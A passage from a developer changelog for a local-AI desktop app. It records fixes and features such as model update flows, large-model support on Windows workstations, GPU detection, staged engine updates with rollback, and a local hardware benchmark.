  scrubs contrib_*, fleet_auto and seen_share from prefs and deletes
  fleet_key, fleet_workers.json and contrib_ledger.json at startup.
  CAUGHT MYSELF: that scrub first ran from a TEST instance, which shares
  the real data folder; it now runs only in the desktop app.
- Found in passing, filed separately: the page references an undeclared
  `perf` (the old perf mode), throwing every 1.5 s. It's on main too.
- Gauntlet 233/233; ci_smoke.sh passes; an isolated end-to-end run
  proved the fallback, the 0600 note and a 0-second handoff.

## 6b311 — no undeclared names in the page
- `perf` threw every 1.5 s. 6b292 folded perf mode into the Visual
  effects switch (noVideo, which also migrates the old millen.perf key)
  and missed one reader: the brand chameleon's interval. It now rests
  while Visual effects are off, as does the parallax the comment above
  it always promised would ("never in perf mode"), and two stale
  comments stopped naming a mode that no longer exists.
- THE SCAN FOUND ONE OF MINE: 6b310's Contribute removal left the Zito
  board's code-board row reading the deleted `peers`. zBuild's .catch
  turned that into "board degraded" and a half-built board. Row removed;
  opened live via the z-i-t-o chord, it builds 8/8 rows.
- jsscan.py (dev tool; builds copy only millenai.py) lists every name
  the page script uses but declares nowhere: it tokenises the script
  (comments, strings, templates with ${}, regex literals) and collects
  every binding made anywhere. Scope-insensitive on purpose: it can miss
  a scope bug, never invents one. On ff71fbd it flags exactly `perf`,
  on 87b71b3 `perf` and `peers`, on this build nothing beyond the host
  globals the page uses (each confirmed present on window), Leaflet's
  L, and the server-filled __X__ placeholders.
- Gauntlet: "no reference to an undeclared perf" and "the page script
  uses no undeclared names" (a new browser API goes in _PAGE_HOST);
  mutation-tested by putting each bug back. 235/235.

## 6b312 — Your models: update what you have, no upsell
Per Patrick: "It should be an update and clean out, not trying to sell
an upgrade to the next highest preset ... I just want them updated."
- The header badge read MODELS AVAILABLE whenever any model of the
  biggest set was missing (forever, for anyone on Fast or Pro) and
  opened the add-models picker. It now reads MODEL UPDATES, lights only
  when models you HAVE have newer versions or old ones to clear
  (st.cleanup), and opens the Update models card.
- The picker, titled "Updates available", greyed out the set you have
  and preselected the next one up. It is "Your models" now: your set
  (currentPlan: the largest fully installed) opens selected and stays
  clickable; picking it runs the Update models flow (runModelUpdate:
  new versions in, old ones out), with "Update models · N GB", "Clear
  out old models · N GB" or "Up to date ✓". A bigger set says "Add Pro
  · 9 GB". The progress bar shows only while something downloads.
- The giants box said "Include 128 GB+ models" for two models that use
  390-430 GB and download 378-418 GB. giant_blurb() builds the label
  and tooltip from the catalog: "Include models for 512 GB Macs", and
  the tooltip names them. Nothing in the catalog sits between GPT-OSS
  120B (64 GB) and the giants.
- (i) tips appear at once. The native title tooltip has a fixed delay
  that can't be shortened, so .hint text moves to data-tip and a small
  script shows it under the icon, inside the window, on hover or focus.
- Caught by the gauntlet on the first run: the page builder in do_GET
  names a local `html`, so html.escape inside it raised
  UnboundLocalError and the page failed to load. _html_escape is bound at
  module level.
- Two-user test on the real Mac (a second macOS login, concordetest): it
  held Llama 3.2 1B's engine port with a logging listener. The new app
  logged "another account holds Llama 3.2 1B's engine port", ran its
  own engine on a free port, answered, and the listener received 0
  bytes. Quitting stopped the moved engine too.
- Gauntlet 239/239.

## 6b313 — The giants box says "systems", not "Macs"
Per Patrick: "we have a Windows version. So maybe say models for 512 GB+
systems."
- giant_blurb() returns "Include models for 512 GB+ systems" and a
  tooltip that says "512 GB or more of memory", with no Mac in either.
- Both giants are MLX-only (no Ollama tag), so on Windows, Linux and
  Intel Macs the box can't add them. Where SUPPORTED has none of them,
  the tooltip adds "For now they run only on Apple silicon Macs."
- The gauntlet runs giant_blurb twice, once as an Apple-silicon Mac and
  once as Windows (SUPPORTED from the Ollama tags). 239/239.

## 6b314 — The Windows giants, and two Windows bugs found on the way
Per Patrick: "let's put those Windows ones in there too. If it detects
that it's a Windows system, it can download those ... given they're not
MLX, I don't think there's much of a purpose" on a Mac.
- Two catalog rows on Ollama, WINDOWS_ONLY: DeepSeek V3.1 671B
  (deepseek-v3.1:671b, the Terminus build, 404.5 GB) and Qwen 3 Coder
  480B (qwen3-coder:480b, 290.1 GB; the bare tag and :latest are the
  18.6 GB 30B). Registry-checked 2026-09-24, both Q4_K_M. Neither Mac
  giant has local Ollama weights (GLM 5.3 is cloud-only there, DeepSeek
  V3.2 left Ollama's library 2026-07-15). Off Windows the rows are
  neither SUPPORTED nor routed, so a hand-pulled copy on a Mac is never
  seated either. Intel Macs get neither pair.
- The giants box names only this computer's giants: the Mac text is
  unchanged; Windows reads "Qwen 3 Coder 480B and DeepSeek V3.1 671B.
  They need 384–512 GB or more of memory (305–417 GB in use) and a
  290–405 GB download."; an Intel Mac lists all four and says where
  they run.
- BUG (pre-existing, Windows): model_cached indexed MODEL_ROUTES for
  rows with no route there (Hermes 4 14B and the MLX giants), so
  /api/setup and /api/tiers raised on every call. The page swallowed
  it: no wizard, no roster, nothing installable from the app on
  Windows. model_cached answers False for an unrouted row, and both
  callers filter by SUPPORTED.
- BUG (pre-existing, every platform): ollama_pulled_tags added a bare
  name for EVERY tag, so the retired "DeepSeek R1" row (bare
  "deepseek-r1") read as on disk whenever deepseek-r1:8b or :671b was,
  and cleanup deleted the first of them (671b sorts first). A bare name
  now stands for :latest only, and _remove_models deletes <tag>:latest.
  The retired LLaVA row now names llava:7b, the tag every version
  pulled (the review caught that the bare "llava" only ever matched
  through the old bug).
- Giants are in no preset any more (rec, and _starter_labels, which is
  Max and the More-models card), on the Mac too: one "Download" could
  start 300-420 GB. They install one at a time from the roster, whose
  button asks again with the size ("download 404.5 GB? click again").
- An Ollama giant (slow_giant) is never seated for you: not by a tier,
  a title or the funnel fallback, and the solo path skips the polish
  pass. It runs when picked, with num_ctx 32768 (Ollama would pick 256k
  on a big GPU, +67 GB), keep_alive 30m (Windows+CUDA loads without
  mmap, so every reload reads 300-400 GB), an hour for the first byte,
  and think:false for DeepSeek V3.1 (Ollama turns thinking on when a
  request doesn't say, and the hidden reasoning costs minutes on CPU).
  The step line says "Loading the model, then writing · 405 GB, can take
  minutes" (the status line isn't drawn before the first words).
  Hand-picked models are filtered by SUPPORTED only; a hand-picked Mac
  giant still runs with the box unticked, as before.
- A read timeout was neither URLError nor retried; it surfaced raw.
  run_model now turns it into a plain message.
- Downloads: progress is bytes across layers (1% of 404 GB is 4 GB,
  so the 10-minute watchdog called healthy pulls "stalled"); the
  watchdog waits 1 s per 100 MB while Ollama verifies; smallest first;
  Windows kept awake during pulls (SetThreadExecutionState); giants
  need Ollama 0.13.5+; time left is quoted up to 72 h and reads in
  hours; a paused download over 50 GB is kept 14 days, not 24 h.
- A GIANT'S PULL WATCHES ITS DRIVE. The first cut checked free space
  before queueing a batch. The five-lens review (5 reviewers, 2
  skeptics per finding) showed it ran on Macs too, failed a whole
  preset when one model didn't fit, counted paused downloads at full
  size, ignored pulls already running, and measured C: when the Ollama
  app's Settings had moved the models (that server gets OLLAMA_MODELS,
  we never do).
  Now, during a giant's pull only, _giant_room finds the drive that
  holds the download's own -partial file (this process's OLLAMA_MODELS,
  the folder in %LOCALAPPDATA%\Ollama\server.log's "server config",
  or ~/.ollama/models) and stops the pull when free space would end
  under 20 GB (Ollama's own count of what is left, the file being
  sparse) or is under 10 GB. Stopping closes the stream; Ollama keeps
  the partial until it next starts (its PruneLayers deletes partials
  over an hour old at startup), so a prompt Retry resumes and the note
  says so. Can't find the file: it says nothing.
- Second review round (3 reviewers, 2 skeptics per finding) confirmed
  every first-round finding fixed or made moot, and found seven more,
  now fixed: the log was read from a 400 KB tail (the config line sits
  at its top, so a few hours of requests hid a moved folder; now up to
  64 MB, last config line wins); the guard kept checking after the last
  byte and could fail a finished install at "writing manifest" (it
  stops checking once nothing is left); on exFAT, where Ollama's file
  already holds its whole size, the 10 GB floor stopped a pull that
  needed nothing more (skipped when the file is full size); a slow
  giant hand-picked WITH other models got the council's 120 s and was
  always abandoned mid-load (it now answers alone); the roster froze
  unless its own click started a download (paintRoster now keeps
  polling while anything moves), a repaint erased the two-step prompt
  and a double-click confirmed it (the prompt lives in rosArmed, and a
  confirm within 600 ms is ignored, for remove too); and failed Image
  or Video installs showed a list "retry" that could start nothing
  (studio rows are left to their cards).
- The roster shows a download's % (or "waiting"), and a failed one its
  reason in red with "retry"; after an install it follows the download
  (rosTick) whether or not Manage is open. The reasons used to reach no
  screen, and the row said "downloading" even when nothing started.
- New gauntlet check: every script in the served page parses under
  node, alone and together. A `function etaTxt` added here collided
  with the answer timer's `let etaTxt`: a SyntaxError that would have
  killed the whole page, and nothing parsed the page before.

## 6b315 — Big graphics cards get big models; the giants are for workstations
Per Patrick: "are there any that we can use that would benefit from a
high-end GPU and not just be on the CPU? A few words per second is
going to be useless to anybody", then "go with your recommendations,
keep the giants workstation-only". Research (4 sweeps, a synthesis and
a fact-check, all sourced) found no 400 GB model runs at GPU speed on a
one-card PC, and that the fast answer is already in the catalog: Qwen
3.8 27B (~130 tok/s on an RTX 5090 through Ollama, measured on Windows;
on Qwen's own tables it matches the 120B class) and GPT-OSS 120B (~200
tok/s on a 96 GB RTX PRO 6000). What was missing was the app seeing the
hardware. Built, then reviewed (5 reviewers, 2 skeptics per finding:
19 confirmed) and rebuilt:
- gpu_inventory: every NVIDIA card summed (it read the largest only);
  AMD and Intel Arc (A/B series) cards on Windows from the display
  drivers' registry records (qwMemorySize; WMI stops at 4 GB), counting
  only adapters PRESENT now (each PCI device's Driver key, checked with
  CM_Locate_DevNodeW), since Windows keeps a removed card's key and a
  slot move counted one card twice. AMD integrated graphics (780M,
  890M, Vega, "Radeon Graphics") and Intel's integrated Arc are left
  out: Ollama skips them. A Ryzen AI Max ("Strix Halo", 8040S-8060S)
  counts only while our own Ollama runs, started with
  OLLAMA_IGPU_ENABLE=1; a user's own Ollama may leave it idle. The
  vendor label breaks ties the same way every launch (NVIDIA, then the
  most memory).
- ONE RULE OFFERS AND ADMITS. The list had offered, and made first-run
  flagships of, models the run-time check then always refused (a 32 GB
  PC's Qwen 3.6 35B MoE; GPT-OSS 120B beside a 24 GB card in a 64 GB
  PC). Now, on a PC or an Intel Mac, a model is offered only when the
  part of it in system RAM (_ram_part: what doesn't fit on the cards,
  less 1 GiB per card), with its headroom (_mem_factor: 1.5, or 1.3 for
  any MOE_ROWS model on Ollama), fits beside 6 GB for Windows and the
  app, the same sum model_fits_memory makes. A model that fits on the
  cards is offered whatever the RAM (a 96 GB card in a 64 GB PC was
  denied GPT-OSS 120B). The gauntlet asserts every offered model is
  admitted on every simulated PC. Apple silicon is unchanged.
- Big models (over 30 GB) get num_ctx 32768 and a 30-minute keep-alive:
  with 47 GiB or more of graphics memory Ollama picks a 256k context
  that pushes a 65-81 GB model off the card, and 45 s meant a reload
  from disk for every question. num_gpu is never sent (it would turn off
  the split that keeps attention on the card and the experts in RAM).
- OLLAMA_BYTES: an Ollama route shows and downloads Ollama's own file
  (GPT-OSS 120B is 65.4 GB there, not the MLX 61), keeping the row's
  allowance above it; presets still pick by the catalog size (cat_gb),
  or Ministral 3 14B's 9.1 GB file pushed it off the 8.5 GB "everyday"
  line on a PC. GPT-OSS 120B's mem stays 64 (a first cut raised it to
  70, which made it unusable on every 96 GB Mac).
- OLLAMA_REQUIRES: the registry's minimum Ollama per tag (Qwen 3.8 27B
  0.32.12, Gemma 4 0.30, Qwen 3.6 0.30, Qwen 3.5 0.17.1; the giants
  0.13.5). An Ollama older than a year refused the starters. A user's
  own Ollama gets a note on the model's row. The app's own copy updates
  BETWEEN RUNS: a newer one is fetched beside it in the background
  (bin.new) and swapped in at the next start, before anything runs from
  the folder. The first cut stopped the running Ollama to swap it, which
  cut off downloads and chats and, on Windows, orphaned the model runner
  holding the folder locked. One lock covers every engine download.
- THE GIANTS ARE FOR WORKSTATIONS: offered, admitted, listed in 'all'
  and downloadable only where RAM plus graphics memory holds 1.05x the
  file (Ollama loads without mmap on Windows), whatever the two boxes
  say. The tooltip says it: "with one graphics card most of the model
  runs from system RAM, at roughly 5-12 tokens a second; it is fast only
  when it all fits in graphics memory (three to five 96 GB cards)", and
  "This computer can't hold them" where it can't. slow_giant is relative
  to the machine: on four 96 GB cards Qwen 3 Coder 480B fits.
- The AMD chip's tooltip no longer says ROCm: the app's Ollama reaches
  AMD through Vulkan.
- Not added: Qwen 3.5 122B (no better than Qwen 3.8 27B), Nemotron 3
  Super (Ollama ships an evaluation-only license), Qwen 3.8 Flash-Next
  (its license needs a separate agreement for an "AI Work Assistant"
  business: Patrick's call).
- gpu_inventory()'s shape, which other code reads by name (the
  benchmark's _bench_gpus, 6b331, uses it when it exists and falls back
  to nvidia-smi): a dict, cached, never raising:
  `{"cards": [(vendor, name, bytes), ...], "vram": int, "vendor": str,
  "igpu": int}`. `cards` holds the discrete cards Ollama runs on, vendor
  "NVIDIA", "AMD" or "Intel", bytes the card's memory; `vram` is one
  vendor's cards summed, the vendor with the most (the review of the
  port: two vendors are two pools); `vendor` the one with the most
  graphics memory, NVIDIA on a tie ("" for none); `igpu` a Ryzen AI
  Max's shared graphics memory, or 0, which is NOT in `cards` or `vram`
  (gpu_vram_bytes adds it only while our own Ollama runs). A Mac reports
  `{"cards": [], "vram": 0, "vendor": "", "igpu": 0}`.
- Ported onto main 2026-09-29 (after 6b330). The branch sat 53 commits
  back; what changed in the port:
  - Main (6b317) already had the engine-download lock and
    `_download_ollama_binary(dest, row)`: the update stage passes
    `row=None` (the branch's `progress=False`). `stream_ollama` takes
    `big` beside 6b325's `label`, and run_model passes both.
  - 6b317's native ARM64 engine swap (bin.arm64 -> bin) and this update
    swap (bin.new -> bin) now follow the same rules: a swap cut short
    between its two renames is undone first (bin.old back), neither swaps
    nor stages while another copy of the app runs, on an ARM64 PC only an
    ARM64 engine goes in, and no update is staged while the native engine
    is on its way (it is the latest one).
  - Profiles (6b329): `_gpus` (the GPU inventory) and `_stage_last` are
    MACHINE_STATE (the gone `_vram` left it); the engine update's writers
    (`_fetch_engine_update`, `_apply_staged_engine`, `_rollback_engine`,
    `_prove_engine`, `_update_note_set`) are MACHINE_IO; its background
    starts go through `ctx_thread(..., bind=False)`, machine work on no
    profile.
    Nothing here reads a personal setting: "no limits" and the giants box
    are the machine's (`machine_prefs`), as main already reads them.
  - Gauntlet: the branch's 9 checks, adapted (the per-platform catalog
    copies, main's `_engine_world` for the ARM64 swap, a doubled keyword
    in the giants check's namespace); the swap and stage checks gained the
    cut-short, sibling, ARM64 and "no update beside the native engine"
    cases (d817a21: 466 checks became 475). Also a 4 GB AMD card (under
    the 6 GB floor) and a moved card counted once when the configuration
    manager can't be read.
- REVIEW OF THE PORT (d817a21, the same day; fixed in the next commit):
  - F1: the background fetch held the engine-download lock for its whole
    1.5 GB, so every model install sat "queued" behind it. It writes
    bin.new, not bin: it has its own lock (`_STAGE_LOCK`), claimed with
    a non-blocking acquire, which is the check-and-set (the `_staging`
    flag is gone).
  - F2: nothing checked the staged engine. The reviewer's probe: a zip
    with the binary one folder down swapped in NO engine, deleted
    bin.old, and didn't recover. Now:
    - `_engine_exe` finds the binary at the top of an engine folder or
      one folder down; `_ollama_bin` and the update use it, and the
      `_MANAGED_BIN_DIR_FOUND` list (written, never read) is gone.
    - The fetch checks the archive against the release's
      sha256sum.txt (as the ollama1 kit does) before unpacking, and marks
      it ready only when the engine runs (`--version`), is newer than
      the one in use and at least what the models need (ARM64 on an
      ARM64 PC). Otherwise it is deleted; a release that is no newer or
      not enough is noted with the day (`bin.update.json`) and not
      fetched again that day.
    - The swap probes the staged engine's version on every platform
      first, and keeps bin.old: `bin.trial` marks the new engine until it
      answers /api/version once (`_prove_engine`, started with our
      Ollama); then bin.old goes. If it dies or stays silent 90 s it is
      stopped, the old engine is put back and started, and that version
      is noted for the day. One never seen answering (the app quit or
      crashed first) is put back at the next start.
  - F3: two fetches at once, and swaps unlocked: one fetch (the lock
    above), and the swap takes `_SWAP_LOCK` without waiting (a second
    caller returns) and does nothing while a fetch writes bin.new. Race
    checks: four callers start one download, four swaps make one.
  - F4: the engine needed was the whole catalog's newest (0.32.12), so an
    Apple-silicon Mac fetched an engine for models it runs on MLX. It is
    now the newest a model THIS computer runs on Ollama asks for.
    DECISION: Apple silicon stays in, by that rule only: its one Ollama
    row with a floor is the MLX-less Qwen 3.5 Vision 9B (0.17.1), so an
    Apple-silicon Mac fetches only when its own engine is older than that
    and the Vision row would fail. Everything else there is unchanged
    (the fit rule never applied to Apple silicon).
  - F5: the row said "a newer engine is downloading" when nothing was.
    `_stage_engine_update` returns what happened and the note follows it:
    downloading, ready (restart), another window open (close every
    ConcordeAI window and reopen), couldn't download (the connection),
    the native ARM64 engine on its way, today's newest release not
    enough (tomorrow), or already on disk (restart).
  - F6: two vendors' cards are two pools, never added (the largest
    counts, and the 1 GiB per card is for its cards); Intel's laptop Arc
    cards (A370M-A770M) count, 6 GB floor kept; the giants' gate also
    needs the row's own estimate plus Windows' 6 GB (Qwen 3 Coder 480B:
    311 GB, not 304.6); a big model gets the hour-long first-byte
    timeout a giant gets.
  - The benchmark (6b331, landed first) reads `gpu_inventory` by name: a
    check runs the real `_bench_gpus` and `bench_hardware` on simulated
    PCs through it (two RTX PRO 6000s, an NVIDIA and an AMD card, a CPU
    box). A Ryzen AI Max's shared memory is no card, so its line says "no
    graphics card in use" (the benchmark's wording, left as it is).
  - Gauntlet: on main with the benchmark (which brought its own checks),
    the port's checks go from 9 to 14 (the engine update's checks
    rebuilt on real folders: the swap and its proof, roll-back and
    next-start roll-back, the nested binary, a binary that doesn't run,
    the fetch's outcomes, the checksum on a real archive, the races, and
    the engine each platform needs). 79 mutations of the fit rule,
    the gate, the registry, vendors, the Strix Halo setting, big models
    and F1-F5: 78 caught; the one
    missed is equivalent (MLX rows counted in the engine floor: an MLX
    route names a port, never a tag with a floor). The first round's two
    equivalents (a "Properties" key, an NVIDIA driver record) are not
    rerun.
- RE-REVIEW OF THE ROLLBACK (3eec6bb; fixed in the next commit):
  - R1: a release that failed its first start was fetched and swapped in
    again at every launch (the day note only skipped a release below the
    need). bin.update.json now keeps `bad`, not tied to the day: the
    roll-back records the version, `_stage_engine_update` asks GitHub
    which release is newest (the "latest" page's redirect, a HEAD, no
    download; today's fetch when GitHub can't be asked) and fetches
    nothing while it isn't past `bad` (status "bad": the row says the
    newest release didn't start here and the app keeps its engine), and
    `_fetch_engine_update` stages nothing at or below it.
  - R2 (Windows): a roll-back refused because the folder was still held
    left nothing running. The renames are tried five times a second
    apart; still held, the engine in place is started, and the trial
    stays so the next start rolls back.
  - R3: a second `ollama serve` (failing on the port the first holds)
    started a second proof, which rolled back under the running engine.
    One proof per trial (`_proof`, under `_PROOF_LOCK`), and a proof
    rolls back only when nothing answers on the port and no serve of
    ours is alive.
  - R4: with bin.old gone, a failed proof left nothing running. The
    engine in place is started anyway; its version is noted as bad.
  - R5: bin.trial is written before the first rename; if it can't be,
    there is no swap.
  - A leftover trial while our Ollama from before still answers: if it
    reports the trial's version, the swap counts as proven, not rolled
    back. (Moved in the follow-up below: the first cut asked the wrong
    port.)
  - Gauntlet: one more check (each case above: the same day, the next
    day and a GitHub that can't be asked refetch nothing past `bad`, a
    newer release is fetched; the held folder; the reviewer's race; no
    bin.old; the trial first; an answering engine). 18 mutations of R1-R5
    and the last case, all caught; the earlier list rerun on this code:
    77 of 78 caught (six re-aimed at the
    changed code), the one missed the equivalent MLX-rows case above.
- FOLLOW-UPS AFTER d153c0b (shipped to main; the re-review's two lows):
  - L1: a quit, crash or power cut between the swap and the new
    engine's first answer marked a GOOD release as bad at the next start
    (the roll-back recorded it). `bad` is now recorded only by
    `_prove_engine`, when it saw the engine die or stay silent 90 s
    (`_rollback_engine(failed=True)`). A start-time roll-back of an
    unfinished trial just rolls back, and the same release is fetched and
    tried again.
  - L2: the "leftover trial, and it answers" case asked OLLAMA_PORT at the
    swap, where our own engine never is (the swap runs only when no serve
    of ours is up), so it could only ever take ANOTHER account's Ollama
    for proof. It moved to `_spawn_ollama_serve`'s early return: when
    the Ollama on our port is this user's (`_listener_is_mine`) and
    reports the trial's version, the swap is proven (`_prove_if_serving`).
  - Gauntlet: the rollback check gained "quit mid-proof: not marked bad,
    fetched again", another account's Ollama proving nothing, and our
    serve proving it (or not, with another version). 7 mutations, all
    caught.
  - Not verified here: Windows itself (the registry and
    CM_Locate_DevNodeW run on fakes; in Patrick's ARM VM the Snapdragon's
    Adreno should read as no card, since it is neither AMD nor Intel), a
    real Strix Halo, and a real engine update end to end.

## 6b316 — The Windows build starts
Patrick, testing the nightly in a Windows 11 ARM VM: "it installed a
bunch of stuff and now it does nothing in Windows." Run with a console,
it died at import: `AttributeError: module 'signal' has no attribute
'SIGHUP'`. The signal handlers named SIGHUP, which Windows doesn't have,
and that line dates from the first commit, so the Windows build has
never started on Windows. The launcher runs pythonw (no console), so the
crash was invisible.
- The handlers are looked up with getattr and skipped when missing.
- On Windows an uncaught error now goes to
  %LOCALAPPDATA%\MillenAI\crash.log and a message box ("ConcordeAI
  couldn't start"), so a failure is never silent again.
- ConcordeAI.bat marks setup done only once pip has succeeded (a failed
  install used to leave a venv behind and every later run skipped setup),
  says why and pauses when it fails, upgrades pip with python -m pip, and
  installs voice input (faster-whisper) separately, since it's optional.
- Verified in the VM: with the fix, the window opens and the first-run
  wizard lists Basic 1.3 GB, Pro 10.9 GB, Max 58.7 GB.
- Gauntlet: the signal loop runs against a Windows-shaped signal module;
  no top-level code may name a signal Windows lacks; the crash hook,
  run as pythonw would, writes the log and shows the box; the launcher
  keeps its checks. Mutation-tested (SIGHUP back, hook removed, no log,
  no box).

## 6b331 — hardware benchmark in Settings › Usage
Patrick: "build the benchmark". A Benchmark section at the foot of
Settings › Usage: one button runs the same fixed test on every local
model installed on this computer and keeps each run, so a later run can
be compared with an earlier one on the same machine.
- **The test** (`BENCH_TEST = "b1"`): a fixed passage about tide mills,
  821 words, 971-991 tokens with the task by the Llama, Qwen and Gemma
  tokenizers in the HF cache (about 1,000 with each chat template), then
  a fixed task ("explain step by step … at least 400 words") capped at
  256 tokens, temperature 0, seed 42 (MLX takes `seed`; Ollama
  `options.seed`), thinking off where the template knows the flag. The
  answer is always longer than 256 tokens, so every model writes the
  same number. Ollama runs with `num_ctx` 4096 (its own default depends
  on the GPU). A new passage or task must get a new BENCH_TEST name: runs
  are compared only within one.
- **What runs:** every model in MODEL_ROUTES that SUPPORTED allows and
  model_cached says is fully on disk (the same test the tiers use), so
  never a cloud model and never a partial download; nothing is ever
  downloaded. Smallest first; the MLX model this copy had loaded goes
  last. Before each model the other MLX engines of this copy are
  stopped, then the app's own admission rule decides:
  `model_fits_memory` false is a skip with the reason, in GB as sold
  (2^30): "it needs about 24 GB free; 17 GB is free now", "it needs
  about 60 GB, more than a model may use on this computer (80% of 48
  GB)", "the largest models are off". Also skipped: a
  giant on Ollama (it loads for many minutes), and an MLX model whose
  port another copy of ConcordeAI is serving (the desktop app and a dev
  copy share the engine ports; one never stops the other's engine).
- **How each number is measured** (bench_numbers):
  - *Writes* (the headline), tokens a second while writing.
    Ollama: `eval_count / eval_duration` from its last line. MLX:
    `(completion_tokens - 1) / (last token - first token)`, the counts
    from the usage chunk (`stream_options.include_usage`), the times on
    time.monotonic as each chunk arrives.
  - *Reads*, prompt tokens a second. Ollama: `prompt_eval_count /
    prompt_eval_duration`. MLX: `(prompt_tokens - cached_tokens) / time
    to first token`; the first token's own step is inside that time
    (about 1 part in 1,000 of the work).
  - *First token*: the request sent to the first token (text or
    reasoning) back, measured here for both engines (Ollama has no such
    figure). It includes reading the passage.
  - *Load*: MLX, the engine process started to its first one-token
    answer back (mlx_lm 0.31 loads the weights after its port opens, so
    the port alone would say "ready" too early; the one-token answer
    also warms the kernels, so the reading figure isn't the first run).
    Ollama: the model is unloaded first (`keep_alive: 0`) so the load is
    cold, then loaded with an empty prompt; its `load_duration`, or the
    wall time of that call when it reports none.
  - *Memory*: sampled once a second while the model loads and writes.
    The figure is the rise in memory in use (total less available)
    from just before the load to the peak: weights, cache and engine.
    Engine RSS is useless for MLX (Metal memory reads ~0, see
    reap_orphan_engines). On Ollama `/api/ps` adds its own size and the
    share on the graphics card ("62% on the GPU" means part runs on the
    CPU).
  - *Memory pressure*: on a Mac, the kernel's level
    (`kern.memorystatus_vm_pressure_level`) reached warning, or the
    compressor grew by 512 MB; mem_pressure() (the sidebar's figure) is
    kept with each model. Elsewhere, memory in use reached 90%.
    *Swapped*: 64 MB or more swapped out (vm_stat's Swapouts) on a Mac,
    the swap in use grown by 256 MB elsewhere; less shows nothing (one
    16 KB page out used to raise the flag).
  - A model still writing at 2 minutes is cut there; its figures come
    from what arrived (tokens counted as chunks, marked estimated) and
    its row says so. A load over 5 minutes fails the model.
- **The hardware line**: "M4 Pro · 48 GB · 20-core GPU" (sysctl's brand,
  memory in GiB as sold, `gpu-core-count` from IOAccelerator). On a PC
  the processor as its maker writes it, the memory, and each kind of
  card with its memory ("2 × RTX 3090 24 GB"), from 6b315's
  gpu_inventory when the build has it (it is on the gpu-fit branch, not
  main yet; `_bench_gpus` looks it up by name and falls back to
  nvidia-smi), else "no graphics card in use". Each run keeps its line;
  the pane says "Measured on …" when an old run's differs. Each run also
  keeps the engines' versions (mlx-lm's package version, Ollama's
  `/api/version`): when the run shown and the run compared differ in
  hardware or versions, the foot line names both.
- **One thing at a time.** A run never starts while an answer is being
  written: each `/api/chat` request (held in `_run` until the request
  ends) and each `run_model` call (the `_bench_guarded` decorator:
  chats, titles, memory, a download's check) is counted, and the start
  is refused while the count isn't zero ("An answer is being written.
  Run the benchmark when it has finished."). While a run goes, chats are
  **refused, not queued**: `/api/chat` answers 409 "A hardware benchmark
  is running. Ask again when it finishes, or stop it in Settings ›
  Usage." before the question is saved, and `run_model` raises the
  same line for background calls. The page asks `GET
  /api/bench/running` before it clears the composer, so the text,
  pictures and files stay where they were and the line shows above the
  composer; if a run starts between that look and the send, the 409
  puts them back and takes a chat this send made out of the list. A Try
  again or Edit & resend no longer rewinds the saved chat before
  asking: the rewind rides in the /api/chat body and the server applies
  it after the hold, so a refused question loses nothing (and the page
  keeps the rewind for the next send). `/api/funnel` is held and
  refused the same way. A run takes minutes; a question
  that waited that long without a word would look like a hang. The MLX
  janitor leaves the engines alone during a run.
- **Stop** cuts the engine call in flight (its socket is shut from the
  route's thread, so a blocked read returns at once), stops the model
  being tested, and marks the rest "not run". Measured: under a second.
  The socket is the one kept when the request went out: mlx_lm answers
  in HTTP/1.0 with no length, and http.client then hands the socket to
  the response and sets `conn.sock` to None (the first cut shut
  nothing, and the model wrote to the end). The clean-up calls (an
  unload, a look at `/api/ps`) go out after a Stop too.
- **Afterwards**: the model that was loaded before was tested last and
  is left loaded ("Llama 3.2 3B is loaded again, as it was before the
  benchmark."). If it was skipped or failed, it is started again; after
  a Stop, or if that fails, the line says it "will load again on your
  next question". With nothing loaded before, the last engine is
  stopped. "Loaded again" means a one-token answer came back (mlx_lm
  loads after its port opens), and a Stop during it says "will load
  again". Every model Ollama holds is unloaded once, before the first
  test, and the line names them ("Ollama loads qwen3.5:9b again on the
  next question that uses it"); each Ollama model under test is
  unloaded after it (`keep_alive` 0, then `/api/ps` watched until the
  runner has gone) and held with the app's own 45 s keep-alive while
  it runs. MLX engines of this copy are stopped before an Ollama row
  too.
- **Memory comes back before the next model.** After each engine goes,
  the next model's fit check and memory base wait until available
  memory stops climbing (`_bench_settle`, _stop_other_mlx's rule, 8 s
  at most): Metal hands wired memory back after the process exits
  (6b239), and `_retire_engine` pops the handle, so `_stop_other_mlx`
  had nothing left to wait for.
- **No run during a download**: a model, engine or studio download
  going or queued refuses the start ("A download is running. …"), and
  an MLX download that finishes during a run doesn't start its engine
  beside the model under test.
- **No home folder in the file**: a failure's note is one line with the
  home folder written as `~`, and every text `_bench_record` saves is
  scrubbed the same way.
- **Nothing leaves the computer.** Every engine call goes through
  `_bench_http`, which refuses any address but 127.0.0.1 before
  connecting. An MLX engine the benchmark starts has `HF_HUB_OFFLINE=1`
  (`_spawn_mlx_engine(offline=True)`): loading a cached model otherwise
  asks the Hub for a newer revision. No leaderboard, no telemetry. The
  benchmark's calls are not in the usage ledger (they aren't a person's
  and have no profile).
- **The history is the machine's.** `benchmarks.jsonl` in the data
  folder (MACHINE_ROOT's, beside prefs.json; never in a profile's
  folder), written only by `_bench_save`, which is named in MACHINE_IO:
  one JSON line a run, appended, fsynced, 0600; past 100 runs the oldest
  go in one atomic rewrite. A torn last line is closed before the next
  append and skipped on read. Every profile sees the same runs. Why the
  machine's: a run measures this computer, not what a person asked;
  nothing in it names a person, and a second profile on the same Mac
  should compare against the same history. The module state (`_bench`,
  `_bench_busy`, `_bench_live`, `_bench_hw`) is in MACHINE_STATE; the
  worker and its memory sampler are `ctx_thread(bind=False)` threads,
  and nothing in it touches a ctx, so the step 8 lints pass unchanged.
- **Routes** (all behind `_gate`: the launch key and the API token; the
  page calls them through `api()`): `GET /api/bench` (the hardware line,
  the run going or the last one this launch, the saved runs newest
  first, and when idle the models a run would test), `POST
  /api/bench/start` (409 with the reason when refused), `POST
  /api/bench/stop`. The page reads `/api/bench` each second while a run
  goes and the pane is open (the usual polling pattern), not otherwise.
- **The pane**: "Benchmark" with the Usage head's icon style, Run
  benchmark / Stop, the hardware line, one line on what the test is, a
  3px breathing bar for the run and "Model 2 of 5 · Llama 3.2 3B", then
  a card with one row a model: name, engine, writes in tok/s (white,
  the headline) and its change against the run picked in "Compare
  with…" (green up, red down), a line with reads, first token and load,
  a line with memory ("memory +2.0 GB · in use at peak 21.3 of 48 GB",
  Ollama's GPU share) and the flags (amber "memory pressure", red
  "swapped 120 MB"). A change inside 3% stays grey (two runs of the
  same model a minute apart differed by 0.5%); a model cut at the time
  limit says "estimated" and is never compared; rows are compared only
  with the same model on the same engine timed the same way. Two runs
  in one minute get their seconds in the picker. The model
